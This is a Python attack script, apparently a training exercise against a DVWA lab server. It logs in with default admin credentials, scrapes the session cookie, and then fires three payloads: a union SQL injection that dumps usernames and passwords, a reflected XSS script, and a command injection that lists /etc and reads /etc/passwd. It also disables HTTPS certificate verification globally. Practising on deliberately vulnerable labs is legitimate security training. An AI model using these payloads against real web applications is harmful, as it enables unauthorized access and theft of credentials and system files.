import socket
import sys
import ssl
from tokenize import tokenize, untokenize, NUMBER, STRING, NAME, OP
from io import BytesIO
import string
import re
import requests #very nescesscary
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context


#Important! You may need to copy your PHP session ID into the codes fields if my absolutely amazing regex fails to find the cookie string. 
def sqlexploit(veryrawcookie): #do the SQL Dump, like this, but replayed. Version 2, we now use requests. The function variables are redundant, for the older sockets code.
    url = "http://192.168.111.133/dvwa/vulnerabilities/sqli_blind/?id=1%27+union+select+user%2C+password+from+users+++++++union+select+1%2C2%27+&Submit=Submit#"
    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}
    cookies = {'security': 'low', 'PHPSESSID': veryrawcookie}
    sqlexploit = requests.get(url, headers=headers, cookies=cookies)
    print('\nSending SQL Payload...:')
    print(sqlexploit.text) #this works, with requests.

def xssexploit(veryrawcookie):
    url = "http://192.168.111.133/dvwa/vulnerabilities/xss_r/?name=<script> alert(\"XSS Message\"); </script>" #one liner.

    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}
    cookies = {'security': 'low', 'PHPSESSID': veryrawcookie}
    data = {'name':'<script> alert("XSS Message"); </script>'} #if it were a post instead of a GET, this is what we need.
    xssexploit = requests.get(url, headers=headers, cookies=cookies)
    print('\nSending XSS Payload...:')
    print(xssexploit.text) 

def rce(veryrawcookie):
    url = "http://192.168.111.133/dvwa/vulnerabilities/exec/#"
    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}
    cookies = {'security': 'low', 'PHPSESSID': veryrawcookie}
    data = {'ip':'8.8.8.8; ls -la /etc/; cat /etc/passwd; whoami', "submit":"submit"} #our payload for the POST, requests is nice enough to format it for us
    rce = requests.post(url, headers=headers, cookies=cookies, data=data)
    print('\nSending RCE Payload...:')
    print(rce.text) #Works!


HOST = "null" # The server's hostname or IP address
HOSTPORT = 80 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((HOST, HOSTPORT))

headers = """\
POST /dvwa/login.php HTTP/1.1\r
Content-Type: {content_type}\r
Content-Length: {content_length}\r
Host: {host}\r
Connection: close\r
\r\n"""



body =  'username=admin&password=admin&Login=Login'                                 
body_bytes = body.encode('ascii')
header_bytes = headers.format(
    content_type="application/x-www-form-urlencoded",
    content_length=len(body_bytes),
    host=HOST + ":" + str(HOSTPORT)
).encode('utf-8')
payload = header_bytes + body_bytes

print('\nVariables prepared..\n')
print('\nHeader:')
print(header_bytes.decode("utf-8"))
print('\nBody:')
print(body_bytes.decode("utf-8"))
print('\nPayload:')
print(payload.decode("utf-8"))
print('\nSending Payload...:')

result = s.sendall(payload)
data = s.recv(1024)
print('\nPrinting POST response...\n', repr(data.decode("utf-8").splitlines()))
print('\nParsing COOKIE')
sessionid = repr(data.decode("utf-8").splitlines())
cookie = re.findall("PHPSESSID=..........................", sessionid) #best regex ever.
rawcookie = re.sub("PHPSESSID=", '', str(cookie)) #TOTAL GARBAGE, might work if the strings fixed in size
veryrawcookie = str(rawcookie.strip("'[]'"))
print(str(veryrawcookie)) #what a hack, brutal, but it works.
#Checking for empty responses, fail if sockets fails. Rest of the code uses requests. Serves as a check, no point in continuing if the first part fails.. 

if data is None:
    print("Failed!")
if data is not None:
    print("Success! Responses received!")
    sqlexploit(veryrawcookie)
    if sqlexploit is not None: # continue
        xssexploit(veryrawcookie)
    if xssexploit is not None: #proceed
        rce(veryrawcookie)
    if rce is not None: #We did it!
        print("\n All done!")
    




zero = 0

